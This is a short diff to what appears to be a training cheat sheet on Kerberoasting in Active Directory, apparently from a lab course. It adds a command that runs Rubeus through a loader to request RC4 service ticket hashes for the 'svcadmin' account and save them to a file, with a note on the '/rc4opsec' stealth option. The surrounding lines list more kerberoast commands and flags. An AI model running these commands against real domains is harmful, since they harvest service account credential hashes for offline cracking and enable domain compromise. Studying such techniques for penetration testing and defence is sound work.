@@ -56,6 +56,11 @@ Rubeus.exe kerberoast /rc4opsec
 # Specific SPN - more stealth
 Rubeus.exe kerberoast /user:svcadmin  /rc4opsec
 
+# use Rubeus to get hashes for the svcadmin account:
+{% hint style="Note" %} we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes. {% endhint %}
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+
 # usefull flags
 /outfile:hashes.txt # output the hashes into file
 /simple # hashes are output in the console one per line
